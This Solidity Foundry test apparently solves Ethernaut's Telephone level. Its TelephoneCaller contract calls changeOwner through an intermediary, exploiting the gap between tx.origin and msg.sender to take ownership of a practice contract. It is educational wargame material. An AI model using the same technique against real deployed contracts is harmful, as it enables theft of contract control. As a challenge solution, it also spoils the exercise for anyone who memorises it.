// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/04-Telephone/TelephoneFactory.sol";
import "../core/Ethernaut.sol";

contract TelephoneTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testTelephoneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // To change the owner in the Telephone contract
        // tx.origin != msg.sender. Hence, an OEA cannot directly call the changeOwner function
        // An intermediary contract is needed: TelephoneCaller
        TelephoneCaller telephoneCaller = new TelephoneCaller(address(ethernautTelephone), attacker);
        telephoneCaller.callTelephone();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract TelephoneCaller {
    Telephone telephone;
    address attacker;

    constructor(address _telephone, address _attacker) {
        require(_telephone.code.length > 0, "Not a contract");
        require(_attacker != address(0), "attacker not set");
        telephone = Telephone(_telephone);
        attacker = _attacker;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker);
        _;
    }

    function callTelephone() external onlyAttacker {
        telephone.changeOwner(attacker);
    }
}
